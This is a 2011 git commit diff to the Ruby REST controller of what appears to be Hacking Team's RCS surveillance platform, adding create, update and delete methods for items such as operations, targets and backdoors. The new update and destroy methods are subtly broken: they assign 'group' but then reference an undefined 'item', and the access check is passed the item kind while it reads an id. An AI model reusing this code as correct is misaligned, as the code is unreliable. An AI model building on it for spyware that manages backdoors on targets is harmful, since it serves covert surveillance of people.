91493bdeb8130cb537fc3a5f88ea1918c785f3ee
daniele <d.milan@hackingteam.it>
2011-07-14 11:58:34 +0200

    Items REST methods for create, update and delete.

--- lib/rcs-db/rest/item.rb
+++ lib/rcs-db/rest/item.rb
@@ -10,19 +10,17 @@ class ItemController < RESTController
   
   def index
     require_auth_level :admin, :tech, :view
-    
-    puts @session[:accessible]
 
     filter = {}
     filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
     
     mongoid_query do
-      filtering = ::Item.any_in(_id: @session[:accessible])
+      items = ::Item.any_in(_id: @session[:accessible])
       filter.each_key do |k|
-        filtering = filtering.any_in(k.to_sym => filter[k])
+        items = items.any_in(k.to_sym => filter[k])
       end
-      
-      items = filtering.only(:name, :desc, :status, :_kind, :_path, :stat)
+
+      items = items.only(:name, :desc, :status, :_kind, :_path, :stat)
       RESTController.reply.ok(items)
     end
   end
@@ -43,8 +41,7 @@ class ItemController < RESTController
     return RESTController.reply.not_found unless ['operation', 'target', 'factory', 'backdoor'].include? @params['_kind']
 
     # enforce authorization levels
-    require_auth_level :admin if ['operation', 'target'].include? @params['_kind']
-    require_auth_level :tech if ['factory', 'backdoor'].include? @params['_kind']
+    check_auth_by_item_kind @params['_kind']
 
     mongoid_query do
       item = Item.create(name: @params['name']) do |doc|
@@ -53,8 +50,8 @@ class ItemController < RESTController
         doc[:status] = @params['status']
         doc[:_kind] = @params['_kind']
         
-        operation = ::Item.find(@params['operation']) if @params.has_key? 'operation'
-        target = ::Item.find(@params['target']) if @params.has_key? 'target'
+        operation = ::Item.where({_id: @params['operation'], _kind: 'operation'}) if @params.has_key? 'operation'
+        target = ::Item.where({_id: @params['target'], _kind: 'target'}) if @params.has_key? 'target'
         
         case doc[:_kind]
           when 'backdoor'
@@ -86,19 +83,67 @@ class ItemController < RESTController
             doc[:contact] = @params['contact']
         end
       end
+
+      # make item accessible to this user
+      @session[:accessible] << item
       
       RESTController.reply.ok(item)
     end
   end
 
   def update
+    # enforce authorization levels
+    check_auth_by_item_kind @params['_kind']
 
+    # check item to destroy is accessible to this user
+    return RESTController.reply.not_found unless is_accessible? @params['_kind']
+
+    mongoid_query do
+      group = Item.find(@params['_id'])
+      @params.delete('_id')
+      return RESTController.reply.not_found if item.nil?
+
+      @params.each_pair do |key, value|
+        if item[key.to_s] != value and not key['_ids']
+          Audit.log :actor => @session[:user][:name], :action => "#{item._kind}.update", item._kind.to_sym => item['name'], :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
+        end
+      end
+
+      result = item.update_attributes(@params)
+
+      return RESTController.reply.ok(group)
+    end
   end
 
   def destroy
+    # enforce authorization levels
+    check_auth_by_item_kind @params['_kind']
 
+    # check item to destroy is accessible to this user
+    return RESTController.reply.not_found unless is_accessible? @params['_kind']
+
+    mongoid_query do
+      group = Item.find(@params['_id'])
+      return RESTController.reply.not_found if item.nil?
+
+      Audit.log :actor => @session[:user][:name], :action => "#{item._kind}.destroy", item._kind.to_sym => @params['name'], :desc => "Deleted #{item._kind} '#{item[:name]}'"
+
+      group.destroy
+      return RESTController.reply.ok
+    end
   end
-  
+
+  private
+
+  def check_auth_by_item_kind(kind)
+    require_auth_level :admin if ['operation', 'target'].include? kind
+    require_auth_level :tech if ['factory', 'backdoor'].include? kind
+  end
+
+  def is_accessible?(id)
+    @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])
+  end
+
 end
 
 end #DB::
